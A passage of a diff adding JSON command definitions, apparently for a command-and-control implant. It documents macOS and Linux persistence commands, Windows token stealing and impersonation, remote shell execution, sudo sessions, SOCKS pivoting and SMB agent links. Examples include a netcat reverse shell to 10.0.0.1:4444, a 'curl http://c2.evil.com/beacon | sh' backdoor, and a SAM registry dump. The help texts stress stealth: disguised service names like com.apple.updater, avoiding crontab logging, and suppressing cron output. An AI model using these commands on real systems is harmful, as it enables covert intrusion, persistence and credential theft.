+      "help": "Lists contents of specified directory with optional filtering:\n- No path shows current directory\n- Supported flags:\n  -a : Show all files including hidden files (files starting with '.')\n  -h : Human-readable file sizes (KB, MB, GB instead of bytes)\n  -R : Recursive listing (includes subdirectories)\n  --max-depth=N : Limit recursion depth (0=current dir only, works with -R)\n  --count : Show only counts of files/directories instead of listing them\n  -f <pattern> or --filter <pattern> : Filter files by pattern (case-sensitive)\n      Can be used multiple times for OR matching\n  -i <pattern> or --filter-ignore <pattern> : Filter files by pattern (case-insensitive)\n      Can be used multiple times for OR matching\n  --exclude <pattern> : Exclude files/directories matching pattern\n      Can be used multiple times\n      Excluded directories are not traversed in recursive mode\n- Flags can be combined (e.g., -ahR --count -f pattern)\n- Filters use substring matching (shows files containing the pattern)\n- Multiple -f or -i flags show files matching ANY pattern (OR logic)\n- Exclusions are applied after inclusion filters\n- By default, hidden files (starting with '.') are not shown unless -a is used\n- When using -R without -a, hidden directories are also skipped\n- --max-depth=0 shows only the current directory (no recursion)\n- --max-depth=1 shows current directory and immediate subdirectories\n- Without --max-depth, -R recurses unlimited depth\n- --count shows statistics instead of file listings\n- With filters, --count shows \"Matching items\" count\n\nExamples of multiple filters and exclusions:\n  ls -f .go -f .md              # Find all Go OR Markdown files\n  ls -i test -i spec             # Find files containing 'test' OR 'spec' (case-insensitive)\n  ls -R --exclude node_modules   # Recursive list, skip node_modules directories\n  ls -f .js --exclude .min.js    # Find .js files but not minified ones\n  ls -R -f .log --exclude archive --exclude backup   # Find logs, skip archive and backup dirs\n",
+      "category": "file",
+      "os": [
+        "windows",
+        "linux",
+        "macos"
+      ],
+      "platforms": {
+        "windows": true,
+        "linux": true,
+        "macos": true
+      }
+    },
+    {
+      "id": "persist",
+      "name": "persist",
+      "description": "Establish persistence through various macOS mechanisms",
+      "syntax": "persist rc --user <username> --command <cmd> [--files .zshrc,.bash_profile]\npersist launch --name <service> --command <cmd> [--user|--system] [--interval <seconds>]\npersist login --name <name> --path <app_path>\npersist periodic --command <cmd> --frequency <daily|weekly|monthly>",
+      "examples": [
+        "persist rc --command '/tmp/backdoor.sh'",
+        "persist rc --user admin --command 'nc -e /bin/sh 10.0.0.1 4444'",
+        "persist rc --command './agent' --files .zshrc,.bash_profile,.profile",
+        "persist launch --name com.apple.updater --command '/tmp/agent' --interval 3600",
+        "persist launch --name com.system.helper --command '/usr/local/bin/backdoor' --system",
+        "persist login --name 'System Helper' --path /Applications/Helper.app",
+        "persist periodic --command '/tmp/beacon.sh' --frequency daily"
+      ],
+      "help": "Establishes persistence on macOS using multiple techniques:\n\nMETHODS:\n\n1. RC FILE PERSISTENCE (rc):\n   - Modifies shell startup files (.zshrc, .bash_profile, .bashrc, .profile)\n   - Executes payload when user opens terminal\n   - Options:\n     --user <username>  Target specific user (default: current)\n     --command <cmd>    Command to persist (required)\n     --files <list>     Comma-separated RC files (default: all common ones)\n   - Payload includes process check to avoid duplicates\n\n2. LAUNCHAGENT/DAEMON (launch):\n   - Creates persistent service using launchd\n   - Options:\n     --name <service>   Service identifier (required)\n     --command <cmd>    Command to execute (required)\n     --user             Install as LaunchAgent (user-level)\n     --system           Install as LaunchDaemon (system-level, requires root)\n     --interval <sec>   Execution interval in seconds (default: 3600)\n   - Creates plist in ~/Library/LaunchAgents or /Library/LaunchDaemons\n   - Service starts at boot and runs periodically\n\n3. LOGIN ITEM (login):\n   - Adds application to user's login items\n   - Options:\n     --name <name>      Display name for login item (required)\n     --path <path>      Path to application (required)\n   - Uses osascript to add item\n   - Note: Requires user approval on modern macOS (TCC)\n\n4. PERIODIC SCRIPTS (periodic):\n   - Adds to system periodic maintenance scripts\n   - Options:\n     --command <cmd>         Command to execute (required)\n     --frequency <period>    daily, weekly, or monthly (required)\n   - Installs in /etc/periodic/{daily,weekly,monthly}/\n   - Requires root privileges\n   - Runs automatically via periodic maintenance\n\nOPERATIONAL NOTES:\n- RC persistence survives reboots and is stealthy\n- LaunchAgent/Daemon provides most reliable persistence\n- Login Items visible in System Preferences\n- Periodic scripts require root but very stealthy\n- Modern macOS may prompt for permissions (TCC)\n- SIP may prevent some persistence methods\n\nEXAMPLES:\n  # Simple RC file backdoor\n  persist rc --command 'curl http://c2.evil.com/beacon | sh'\n  \n  # LaunchAgent with custom interval\n  persist launch --name com.adobe.update --command '/tmp/malware' --user --interval 300\n  \n  # System-level LaunchDaemon (requires root)\n  persist launch --name com.apple.security --command '/usr/local/bin/agent' --system\n  \n  # Add login item (visible to user)\n  persist login --name 'Dropbox Helper' --path /Applications/Evil.app\n  \n  # Daily periodic task (requires root)\n  persist periodic --command '/opt/backdoor/beacon' --frequency daily\n",
+      "category": "persistence",
+      "os": [
+        "darwin",
+        "linux"
+      ],
+      "platforms": {
+        "windows": false,
+        "linux": true,
+        "macos": true
+      }
+    },
+    {
+      "id": "persist-cron",
+      "name": "persist-cron",
+      "description": "Manage cron-based persistence on Linux systems with multiple methods",
+      "syntax": "persist-cron <action> [options]\nActions:\nadd [--method <method>] [--user <user>] [--interval <time>] [--command <cmd>]\nremove [--method <method>] [--user <user>]\nlist",
+      "examples": [
+        "persist-cron add --method spool --interval @hourly",
+        "persist-cron add --method crond --interval '*/15 * * * *'",
+        "persist-cron add --method periodic --interval @daily",
+        "persist-cron add --method anacron",
+        "persist-cron add --method all --command /tmp/.daemon",
+        "persist-cron add",
+        "persist-cron remove --method spool",
+        "persist-cron remove --method all",
+        "persist-cron list"
+      ],
+      "help": "Manages cron-based persistence using multiple selectable methods for redundancy and stealth.\n\nMETHODS:\n  spool     - User crontab files in /var/spool/cron/\n  crond     - System-wide /etc/cron.d/ file  \n  periodic  - Cron directories (/etc/cron.hourly, daily, weekly, monthly)\n  anacron   - Anacron for systems not always on\n  all       - Try all methods (default)\n\nACTIONS:\n1. ADD - Install cron persistence\n   Uses selected method(s) to establish persistence:\n   \n   Method: spool\n     - Direct manipulation of crontab files\n     - Locations checked:\n       \u2022 /var/spool/cron/crontabs/<user>\n       \u2022 /var/spool/cron/<user>\n       \u2022 /var/spool/cron/tabs/<user>\n     - No crontab command used (stealthier)\n     - Checks write permissions with unix.Access\n   \n   Method: crond\n     - Creates file in /etc/cron.d/\n     - File named \"system-check\" (looks legitimate)\n     - System-wide execution\n     - Includes proper SHELL and PATH definitions\n   \n   Method: periodic\n     - Creates scripts in cron directories\n     - Maps intervals to appropriate directory:\n       \u2022 @hourly  \u2192 /etc/cron.hourly/\n       \u2022 @daily   \u2192 /etc/cron.daily/\n       \u2022 @weekly  \u2192 /etc/cron.weekly/\n       \u2022 @monthly \u2192 /etc/cron.monthly/\n     - Script named \"system-update\"\n     - Executable bash scripts (755 permissions)\n   \n   Method: anacron\n     - Modifies /etc/anacrontab\n     - For systems not running 24/7\n     - Job named \"system-maint\"\n     - 5-minute delay, daily execution\n   \n   Options:\n     --method <method>  Persistence method (default: all)\n     --user <user>      Target user (default: current)\n     --interval <time>  Execution interval (default: @hourly)\n     --command <cmd>    Command to run (default: current binary via /proc/self/exe)\n   \n   Interval formats:\n     @reboot          Run at startup\n     @hourly          Run every hour (randomized minute)\n     @daily           Run daily (randomized hour/minute)\n     @weekly          Run weekly (randomized day/hour/minute)\n     @monthly         Run monthly (randomized day/hour/minute)\n     '*/15 * * * *'   Standard cron format (every 15 minutes)\n     '0 2 * * *'      Daily at 2 AM\n\n2. REMOVE - Clean cron persistence\n   Removes persistence from selected method(s):\n   \n   Options:\n     --method <method>  Method to remove (default: all)\n     --user <user>      Target user (default: current)\n   \n   Cleanup targets by method:\n     spool:    User crontab files\n     crond:    /etc/cron.d/system-check\n     periodic: Scripts in cron directories\n     anacron:  Entries in /etc/anacrontab\n     all:      All of the above\n\n3. LIST - Show installed persistence\n   Scans all locations for persistence:\n   - Checks user crontabs for \"Added by system at\" comments\n   - Looks for /etc/cron.d/system-check\n   - Searches cron directories for system-update scripts\n   - Scans anacrontab for system-maint entries\n   - Reports all found persistence mechanisms\n\nSTEALTH FEATURES:\n- Randomized execution times using Unix timestamp modulo\n- Legitimate-looking names (system-check, system-update, system-maint)\n- Timestamped comments for authenticity\n- Output redirected to /dev/null (prevents cron emails)\n- Direct file manipulation (avoids crontab command logging)\n- Uses unix.Access for permission checks (less noisy than stat)\n- Checks for existing entries to avoid duplicates\n\nSECURITY FEATURES:\n- Permission checking before write attempts\n- Proper file permissions (600 for user crons, 644 for system)\n- Falls back to /proc/self/exe or os.Args[0] for binary path\n- Handles missing users/paths gracefully\n- Returns detailed success/failure for each method\n\nREDUNDANCY:\n- Method \"all\" attempts every persistence technique\n- Multiple paths checked for each method\n- Continues trying other methods if one fails\n- Returns aggregated results showing what worked\n- Different methods work with different privilege levels\n\nEXAMPLES:\n  # Default persistence (all methods, hourly)\n  persist-cron add\n  \n  # Specific method with custom interval\n  persist-cron add --method spool --interval '*/30 * * * *'\n  \n  # System-wide daily persistence\n  persist-cron add --method crond --interval @daily --user root\n  \n  # Periodic execution with custom command\n  persist-cron add --method periodic --interval @weekly --command /opt/backup.sh\n  \n  # Anacron for laptops/workstations\n  persist-cron add --method anacron\n  \n  # Try everything with custom binary\n  persist-cron add --method all --command /tmp/.daemon\n  \n  # Check what's installed\n  persist-cron list\n  \n  # Remove specific method\n  persist-cron remove --method spool\n  \n  # Clean everything\n  persist-cron remove --method all\n\nOPERATIONAL NOTES:\n- No system binaries used (crontab, at, systemctl avoided)\n- Works across different Linux distributions\n- Some methods require elevated privileges:\n  \u2022 spool: Usually works for current user\n  \u2022 crond: Requires root or sudo\n  \u2022 periodic: Requires root or sudo\n  \u2022 anacron: Requires root or sudo\n- Method selection allows privilege-appropriate persistence\n- Test in controlled environment first\n- Always include cleanup in operational plans\n",
+      "category": "persistence",
+      "os": [
+        "linux"
+      ],
+      "platforms": {
+        "windows": false,
+        "linux": true,
+        "macos": false
+      }
+    },
+    {
+      "id": "ps",
+      "name": "ps",
+      "description": "List running processes with optional filtering and detailed information",
+      "syntax": "ps                                      # Basic process list (PID, PPID, Name)\nps -v                                   # Verbose mode with command line and executable path\nps -x                                   # Extended mode with resource usage\nps -j                                   # Output in JSON format\nps --no-truncate                        # Show full names/paths without truncation\nps -f <pattern>                         # Filter by process name\nps -u <username>                        # Filter by username\nps -s <field>                           # Sort by field (cpu, mem, pid, name, user, time)\nps [flags...] [options...]              # Combine multiple flags and options",
+      "examples": [
+        "ps",
+        "ps -v",
+        "ps -x",
+        "ps -v -x",
+        "ps -j",
+        "ps --no-truncate",
+        "ps -v --no-truncate",
+        "ps -f chrome",
+        "ps -u root",
+        "ps -s cpu",
+        "ps -x -s mem"
+      ],
+      "help": "Lists running processes on the target system with optional filtering and detailed information.\n\nTOKEN CONTEXT (Windows):\nWhen an impersonation token is active (via steal-token or make-token):\n- Process enumeration uses the impersonated user's privileges\n- May show different processes based on access rights\n- Hidden/protected processes may become visible with SYSTEM token\n- Process details (user, command line) depend on token privileges\n\nFLAGS:\n  -v, --verbose     Include command line arguments and executable path\n  -x, --extended    Include resource usage (CPU%, memory, threads, status, user)\n  -j, --json        Output in JSON format for parsing/scripting\n  --no-truncate     Don't truncate fields - show full process names, paths, and commands\n\nOPTIONS:\n  -f, --filter <pattern>    Filter processes by name (partial match, case-insensitive)\n  -u, --user <username>     Show only processes owned by specified user\n  -s, --sort <field>        Sort output by field\n\nSORT FIELDS:\n  cpu     Sort by CPU usage (highest first)\n  mem     Sort by memory usage (highest first)  \n  pid     Sort by process ID (ascending)\n  name    Sort by process name (alphabetical)\n  user    Sort by username (alphabetical)\n  time    Sort by creation time (oldest first)\n\nOUTPUT COLUMNS:\n\nBasic mode:\n  PID      Process ID\n  PPID     Parent Process ID\n  NAME     Process name\n\nExtended mode (-x) adds:\n  USER     Process owner\n  CPU%     CPU usage percentage\n  MEM%     Memory usage percentage\n  MEM(MB)  Memory usage in megabytes\n  THREADS  Number of threads\n  STATUS   Process status (Running, Sleeping, Stopped, etc.)\n\nVerbose mode (-v) adds:\n  EXECUTABLE  Full path to executable\n  COMMAND     Full command line with arguments\n\nEXAMPLES WITH TOKENS:\n\nWithout token:\n  ps -x                 # Shows processes visible to current user\n  \nWith SYSTEM token:\n  steal-token 1752 system\n  ps -x                 # Shows ALL processes including protected ones\n  ps -f lsass           # Can now see details of protected processes\n  rev2self              # Revert token\n\nCombined with filtering:\n  steal-token use admin\n  ps -u SYSTEM          # List all SYSTEM processes with admin token\n  ps -f svchost -x      # Detailed view of service hosts\n",
+      "category": "process",
+      "os": [
+        "windows",
+        "linux",
+        "macos"
+      ],
+      "platforms": {
+        "windows": true,
+        "linux": true,
+        "macos": true
+      }
+    },
+    {
+      "id": "pwd",
+      "name": "pwd",
+      "description": "Print working directory",
+      "syntax": "pwd",
+      "examples": [
+        "pwd"
+      ],
+      "help": "Shows current working directory on target system",
+      "category": "file",
+      "os": [
+        "windows",
+        "linux",
+        "macos"
+      ],
+      "platforms": {
+        "windows": true,
+        "linux": true,
+        "macos": true
+      }
+    },
+    {
+      "id": "rekey",
+      "name": "rekey",
+      "description": "Re-initialize client encryption and get new client ID",
+      "syntax": "rekey",
+      "examples": [
+        "rekey"
+      ],
+      "help": "Forces the client to perform a new initialization handshake:\n- Gets new client ID\n- Resets encryption state\n- Re-establishes secure channel\nUse when encryption gets out of sync.\n",
+      "category": "utility",
+      "os": [
+        "windows",
+        "linux",
+        "macos"
+      ],
+      "platforms": {
+        "windows": true,
+        "linux": true,
+        "macos": true
+      }
+    },
+    {
+      "id": "rev2self",
+      "name": "rev2self",
+      "description": "Revert token impersonation and return to original security context",
+      "syntax": "rev2self",
+      "examples": [
+        "rev2self"
+      ],
+      "help": "Reverts any active token impersonation and returns to the original security context.\n\nOVERVIEW:\nUniversal command to revert impersonation from both steal-token and make-token.\nCleans up impersonation handles and resets to the process's original token.\nSafe to call even when not impersonating.\n\nUSAGE:\n  rev2self                            # Revert any active impersonation\n\nBEHAVIOR:\n- Calls Windows RevertToSelf API\n- Cleans up stored impersonation handles\n- Resets internal impersonation state\n- Shows before/after user context\n- Safe to call multiple times\n\nWORKS WITH:\n- steal-token impersonations\n- make-token impersonations\n- Any other token manipulations\n\nEXAMPLES:\n\nAfter steal-token:\n  steal-token 1752                    # Become SYSTEM\n  whoami                              # Shows SYSTEM\n  rev2self                            # Revert\n  whoami                              # Shows original user\n\nAfter make-token:\n  make-token CORP\\admin Pass123      # Create token\n  make-token impersonate              # Use token\n  whoami                              # Shows CORP\\admin\n  rev2self                            # Revert\n  whoami                              # Shows original user\n\nChain operations:\n  steal-token 4532                    # Steal user1\n  # ... operations as user1 ...\n  make-token CORP\\svc Pass456        # Create service token\n  make-token impersonate              # Use service token\n  # ... operations as service ...\n  rev2self                            # Back to original\n",
+      "category": "token",
+      "os": [
+        "windows"
+      ],
+      "platforms": {
+        "windows": true,
+        "linux": false,
+        "macos": false
+      }
+    },
+    {
+      "id": "rm",
+      "name": "rm",
+      "description": "Remove files and directories from the target system",
+      "syntax": "rm <file/directory>...                    # Remove files\nrm -r <directory>...                      # Remove directories recursively\nrm -f <file/directory>...                 # Force removal, ignore errors\nrm -rf <directory>...                     # Force recursive removal\nrm --recursive <directory>...             # Long form of -r\nrm --force <file/directory>...            # Long form of -f",
+      "examples": [
+        "rm file.txt",
+        "rm file1.txt file2.txt file3.txt",
+        "rm -r /tmp/test_dir",
+        "rm -rf /var/log/old_logs",
+        "rm -f nonexistent.txt",
+        "rm -r dir1 dir2 dir3",
+        "rm -rf C:\\Temp\\*",
+        "rm --recursive --force /tmp/cache"
+      ],
+      "help": "Removes files and directories from the target system.\n\nFLAGS:\n  -r, -R, --recursive   Remove directories and their contents recursively\n  -f, --force          Ignore nonexistent files, suppress errors\n  -rf, -fr             Combine recursive and force (common usage)\n\nEXAMPLES BY USE CASE:\n\nRemove temporary files:\n  rm /tmp/*.log                # Remove all log files\n  rm -f /tmp/cache_*           # Force remove cache files\n\nClean up directories:\n  rm -r build/                 # Remove build directory\n  rm -rf node_modules/         # Force remove dependencies\n\nBatch removal:\n  rm *.bak *.tmp *.log         # Remove multiple file types\n  rm -r old_* archive_*        # Remove multiple directories\n\nWindows examples:\n  rm C:\\Users\\Public\\file.txt     # Remove single file\n  rm -r C:\\Temp\\TestFolder         # Remove folder\n  rm -rf C:\\Windows\\Temp\\*         # Clean temp (requires admin)\n\nUnix/Linux examples:\n  rm /var/log/app.log               # Remove log file\n  rm -r ~/.cache/                   # Remove cache directory\n  rm -rf /tmp/session-*             # Remove session files\n",
+      "category": "file",
+      "os": [
+        "windows",
+        "linux",
+        "macos"
+      ],
+      "platforms": {
+        "windows": true,
+        "linux": true,
+        "macos": true
+      }
+    },
+    {
+      "id": "shell",
+      "name": "shell",
+      "description": "Execute a shell command on the target system (token-aware on Windows)",
+      "syntax": "shell <command> [arguments...]\nshell --timeout <seconds> <command> [arguments...]",
+      "examples": [
+        "shell whoami",
+        "shell netstat -an",
+        "shell ps aux",
+        "shell ipconfig /all",
+        "shell ls -la /tmp",
+        "shell --timeout 5 ping google.com",
+        "shell --timeout 60 ./long-running-script.sh"
+      ],
+      "help": "Executes commands in the target system's shell:\n- Windows: Uses cmd.exe (token-aware - see below)\n- Linux/macOS: Uses user's default shell ($SHELL) with fallback to bash, zsh, then sh\n- Command and all arguments are passed directly to the shell\n- Output is returned when the command completes\n- Default timeout is 30 seconds\n\nTOKEN-AWARE EXECUTION (Windows):\nWhen a token is active (via steal-token or make-token), shell commands automatically:\n- Execute with the impersonated user's privileges\n- Use CreateProcessAsUser API for proper token inheritance\n- Show the active token name in command output\n- Maintain token context across command execution\n\nExample workflow:\n  steal-token 1752 system     # Steal SYSTEM token\n  shell whoami                # Returns \"NT AUTHORITY\\SYSTEM\"\n  shell reg save HKLM\\SAM sam  # Works with SYSTEM privileges\n  rev2self                     # Revert to original token\n  shell whoami                # Returns original user\n\nOptions:\n  --timeout <seconds>  Set custom timeout for command execution (default: 30)\n  \nExamples:\n  shell whoami                    # Run whoami with default 30s timeout\n  shell --timeout 5 ping 8.8.8.8  # Run ping with 5 second timeout\n  shell --timeout 60 ./script.sh  # Run script with 60 second timeout\n  \nShell Detection (Unix/Linux/macOS):\n  1. Uses $SHELL environment variable if set and valid\n  2. Falls back to /bin/bash if available\n  3. Falls back to /bin/zsh if available (macOS default)\n  4. Falls back to /bin/sh as last resort (POSIX standard)\n  \nSecurity Notes:\n- Commands run with agent's privileges (or impersonated token on Windows)\n- No input sanitization is performed\n- Use with caution on production systems\n- Token context is shown in output header on Windows\n",
+      "category": "execution",
+      "os": [
+        "windows",
+        "linux",
+        "macos"
+      ],
+      "platforms": {
+        "windows": true,
+        "linux": true,
+        "macos": true
+      }
+    },
+    {
+      "id": "sleep",
+      "name": "sleep",
+      "description": "Change agent check-in interval and jitter",
+      "syntax": "sleep <duration> [jitter_percent]",
+      "examples": [
+        "sleep 30",
+        "sleep 1m 15",
+        "sleep 1m30s 5",
+        "sleep 2h 10",
+        "sleep 1h5m 20"
+      ],
+      "help": "Changes the agent polling/sleep interval and jitter:\n- Duration supports s(seconds), m(minutes), h(hours)\n- Can combine units: 1m30s, 1h5m, 2h30m\n- Optional jitter percentage (0-100)\n- Examples: sleep 30s 5 (30 sec, 5% jitter), sleep 1m30s 15 (90 sec, 15% jitter)\n- Takes effect on next check-in\n",
+      "category": "utility",
+      "os": [
+        "windows",
+        "linux",
+        "macos"
+      ],
+      "platforms": {
+        "windows": true,
+        "linux": true,
+        "macos": true
+      }
+    },
+    {
+      "id": "socks",
+      "name": "socks",
+      "description": "Start/stop SOCKS proxy server",
+      "syntax": "socks <start|stop> <socks_port> <path> <wss_port>",
+      "examples": [
+        "socks start 1080 https://domain.com/some/path 443",
+        "socks stop 1080"
+      ],
+      "help": "Starts or stops a SOCKS proxy server:\n- Requires a valid WebSocket URL\n- Start requires ports for SOCKS and WSS\n- Stop requires only the SOCKS port\n",
+      "category": "network",
+      "os": [
+        "windows",
+        "linux",
+        "macos"
+      ],
+      "platforms": {
+        "windows": true,
+        "linux": true,
+        "macos": true
+      }
+    },
+    {
+      "id": "sudo_session",
+      "name": "sudo-session",
+      "description": "Manage persistent sudo sessions with optional state tracking for elevated command execution",
+      "syntax": "sudo-session start <password> [username]  # Start session as root or specified user\nsudo-session exec <command>               # Execute command in active session\nsudo-session exec-stateful <command>      # Execute with forced state persistence\nsudo-session enable-stateful              # Enable state tracking (cd, env vars persist)\nsudo-session disable-stateful             # Disable state tracking (default)\nsudo-session status                       # Check session status and mode\nsudo-session stop                         # Terminate active session",
+      "examples": [
+        "sudo-session start mypassword",
+        "sudo-session start mypassword postgres",
+        "sudo-session exec whoami",
+        "sudo-session enable-stateful",
+        "sudo-session exec cd /tmp",
+        "sudo-session exec pwd",
+        "sudo-session exec export FOO=bar",
+        "sudo-session exec echo $FOO",
+        "sudo-session exec-stateful ls",
+        "sudo-session disable-stateful",
+        "sudo-session status",
+        "sudo-session stop"
+      ],
+      "help": "Manages an elevated shell session with optional state persistence:\n\nEXECUTION MODES:\n  Stateless (Default): Each command runs independently, no state persists\n  Stateful (Optional): Tracks directory changes and environment variables\n\nSUBCOMMANDS:\n  start <password> [username]  - Start sudo session (default: root)\n  exec <command>               - Execute command (uses current mode)\n  exec-stateful <command>      - Force stateful execution for one command\n  enable-stateful              - Switch to stateful mode\n  disable-stateful             - Switch to stateless mode (default)\n  status                       - Show session info, mode, and tracked state\n  stop                         - Terminate the session\n\nHOW STATEFUL MODE WORKS:\n  - Tracks 'cd' commands and maintains working directory\n  - Tracks 'export' commands and maintains environment variables\n  - Applies tracked state to each command execution\n  - Each command still runs independently (reliable)\n  - State is simulated, not using a persistent shell\n\nUSER SUPPORT:\n  - Default: 'sudo-session start <password>' switches to root\n  - Specific user: 'sudo-session start <password> <username>'\n  - Examples: postgres, www-data, oracle, nginx, etc.\n\nUSAGE FLOWS:\n\n  Stateless (Reliable, Default):\n    sudo-session start mypass\n    sudo-session exec cd /tmp        # Doesn't affect next command\n    sudo-session exec pwd            # Still in original directory\n    \n  Stateful (State Tracking):\n    sudo-session start mypass\n    sudo-session enable-stateful\n    sudo-session exec cd /tmp        # Changes tracked directory\n    sudo-session exec pwd            # Shows /tmp\n    sudo-session exec export FOO=bar # Sets tracked env var\n    sudo-session exec echo $FOO      # Shows 'bar'\n\n  # Check current mode and state\n  sudo-session status\n  # Output: Active session for user 'root' (PID: 12345, Mode: stateful (simulated, pwd: /etc/nginx), Uptime: 2m)\n  \n  # Environment variables (stateful only)\n  sudo-session enable-stateful\n  sudo-session exec export DB_HOST=localhost\n  sudo-session exec export DB_PORT=5432\n  sudo-session exec 'echo Database: $DB_HOST:$DB_PORT'  # Shows: Database: localhost:5432\n  \n  # Clean up\n  sudo-session stop\n\nSECURITY NOTES:\n  - Password stored in memory during session\n  - Session remains active until stopped or agent disconnects\n  - Always use 'sudo-session stop' when done\n  - Each agent has independent sessions\n  \nTECHNICAL DETAILS:\n  - Stateless: Each 'exec' runs 'sudo -S sh -c <command>' independently\n  - Stateful: Tracks state and runs 'cd <dir> && export VAR=val && <command>'\n  - Falls back to stateless if any issues occur\n  - Status shows current mode and tracked directory\n",
+      "category": "execution",
+      "os": [
+        "linux",
+        "darwin"
+      ],
+      "platforms": {
+        "windows": false,
+        "linux": true,
+        "macos": true
+      }
+    },
+    {
+      "id": "token",
+      "name": "token",
+      "description": "Comprehensive token management for impersonation and lateral movement",
+      "syntax": "token create <DOMAIN\\user> <pass> <name> [type]\ntoken create netonly <DOMAIN\\user> <pass> <name>\ntoken steal <pid> [name] [netonly]\ntoken store <pid> <name> [netonly]\ntoken use <name> [netonly]\ntoken impersonate\ntoken netonly [set|clear|status]\ntoken list [processes]\ntoken current\ntoken remove <name>\ntoken clear\ntoken revert",
+      "examples": [
+        "token create CORP\\admin Pass123 admin-tok",
+        "token create netonly REMOTE\\svc SvcPass remote-net",
+        "token steal 1752 system-tok",
+        "token store 4568 backup-tok netonly",
+        "token use admin-tok",
+        "token netonly set remote-admin",
+        "token list processes",
+        "token current",
+        "token revert"
+      ],
+      "help": "OVERVIEW:\nUnified token management system for creating, stealing, and managing Windows security tokens.\nSupports both full impersonation and network-only tokens for flexible privilege escalation.\nAll tokens are stored in a unified repository accessible across operations.\n\nCORE CONCEPTS:\n- Full Impersonation: Changes both local and network identity\n- Network-Only: Affects only network operations, preserves local identity\n- Unified Store: All tokens (created or stolen) share the same storage\n\nVERBS:\n\n\u2550\u2550\u2550 TOKEN CREATION \u2550\u2550\u2550\n\ncreate <DOMAIN\\user> <pass> <n> [type] - Create token via LogonUser:\n  Creates a new token using Windows LogonUser API\n  Default type is 'interactive' if not specified\n  Token is stored but NOT automatically used\n  Example: token create CORP\\admin Pass123 admin-tok\n  \ncreate netonly <DOMAIN\\user> <pass> <n> - Create network-only token:\n  Creates token specifically for network operations\n  Local operations remain unaffected\n  Must activate with 'token netonly set'\n  Example: token create netonly REMOTE\\svc SvcPass remote-net\n\n\u2550\u2550\u2550 TOKEN STEALING \u2550\u2550\u2550\n\nsteal <pid> [name] [netonly] - Steal and impersonate:\n  Duplicates target process token\n  Immediately impersonates (unless netonly)\n  Auto-generates name if not provided\n  Example: token steal 1752 system-tok\n  Example: token steal 1752 net-tok netonly\n\nstore <pid> <n> [netonly] - Store without using:\n  Duplicates and stores token for later\n  Does NOT impersonate immediately\n  Build a library of tokens\n  Example: token store 4568 backup-tok netonly\n\nlist processes - Show stealable tokens:\n  Enumerates all accessible process tokens\n  Shows process name, PID, and owner\n  Identifies current process\n  Example: token list processes\n\n\u2550\u2550\u2550 TOKEN USAGE \u2550\u2550\u2550\n\nuse <n> [netonly] - Activate stored token:\n  Switches to any stored token\n  Works with both created and stolen tokens\n  Optional netonly for network-only activation\n  Example: token use admin-tok\n  Example: token use remote-tok netonly\n\nimpersonate - Quick impersonation:\n  Uses most recent created token\n  Skips network-only tokens\n  Shortcut for common workflow\n  Example: token impersonate\n\n\u2550\u2550\u2550 NETWORK-ONLY MANAGEMENT \u2550\u2550\u2550\n\nnetonly set <n> - Set network token:\n  Activates token for network operations only\n  Local identity remains unchanged\n  Can be combined with full impersonation\n  Example: token netonly set remote-admin\n\nnetonly clear - Clear network token:\n  Removes active network-only token\n  Network ops revert to current identity\n  Does not affect full impersonation\n  Example: token netonly clear\n\nnetonly status - Show network status:\n  Displays active network-only token\n  Shows tokens marked as network-only\n  Lists current configuration\n  Example: token netonly status\n\n\u2550\u2550\u2550 TOKEN INFORMATION \u2550\u2550\u2550\n\nlist - Show all stored tokens:\n  Displays complete token inventory\n  Shows user, source, and metadata\n  Indicates active tokens\n  Example: token list\n\nstored - Alias for list:\n  Same as 'token list'\n  Shows all tokens in store\n  Example: token stored\n\ncurrent - Show token status:\n  Displays current effective identity\n  Shows active impersonation\n  Shows network-only token if set\n  Example: token current\n\nstatus - Alias for current:\n  Same as 'token current'\n  Example: token status\n\n\u2550\u2550\u2550 TOKEN CLEANUP \u2550\u2550\u2550\n\nremove <n> - Delete stored token:\n  Removes token from store\n  Cannot remove active tokens\n  Frees associated resources\n  Example: token remove backup-tok\n\nclear - Remove all created tokens:\n  Cleans up all LogonUser tokens\n  Does not affect stolen tokens\n  Handles active tokens gracefully\n  Example: token clear\n\nrevert - Revert all impersonation:\n  Returns to original identity\n  Clears both full and network tokens\n  Same as rev2self command\n  Example: token revert\n\n\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n\nLOGON TYPES FOR CREATE:\n  interactive       - Interactive logon (default)\n  network          - Network logon (no local access)  \n  batch            - Batch job logon\n  service          - Service account logon\n  network_cleartext - Network with cleartext credentials\n  new_credentials  - Clone current with new network creds\n\nWORKFLOW EXAMPLES:\n\nBasic Token Theft:\n  token list processes              # Find target process\n  token steal 1752 system          # Steal and impersonate\n  whoami                           # Verify new identity\n  token revert                     # Return to original\n\nNetwork-Only Access:\n  token create netonly CORP\\admin Pass123 corp-net\n  token netonly set corp-net      # Activate for network\n  net use \\\\dc01\\c$              # Uses CORP\\admin\n  dir C:\\                          # Uses original identity\n  token netonly clear              # Deactivate\n\nBuilding Token Library:\n  token store 1752 system-tok     # Store SYSTEM token\n  token store 2140 admin-tok      # Store admin token\n  token create CORP\\svc Pass svc-tok  # Create service token\n  token list                      # View all tokens\n  token use admin-tok             # Switch as needed\n\nMixed Operations:\n  token steal 1752 local-system   # Full impersonation\n  token create netonly REMOTE\\admin Pass remote-net\n  token netonly set remote-net    # Set network token\n  # Now: Local = SYSTEM, Network = REMOTE\\admin\n",
+      "category": "token",
+      "os": [
+        "windows"
+      ],
+      "platforms": {
+        "windows": true,
+        "linux": false,
+        "macos": false
+      }
+    },
+    {
+      "id": "unlink",
+      "name": "unlink",
+      "description": "Disconnect from a linked SMB agent",
+      "syntax": "unlink <agent_id>\nunlink all",
+      "examples": [
+        "unlink abc123",
+        "unlink all"
+      ],
+      "help": "Disconnects from a linked SMB agent.\n\nUSAGE:\n  unlink <agent_id>    Disconnect from a specific linked agent\n  unlink all           Disconnect from all linked agents\n\nWhen an agent is unlinked:\n- The SMB pipe connection is closed\n- The link agent stops receiving commands through this edge agent\n- The link agent may attempt to reconnect or remain dormant\n\nNOTE: This does not kill the remote SMB agent - it only severs\nthe connection. The SMB agent will continue running and can be\nre-linked later.\n\nEXAMPLES:\n  # Unlink a specific agent (use agent ID from tree view)\n  unlink abc123def456\n\n  # Unlink all connected SMB agents\n  unlink all\n",
+      "category": "network",
+      "os": [
+        "windows"
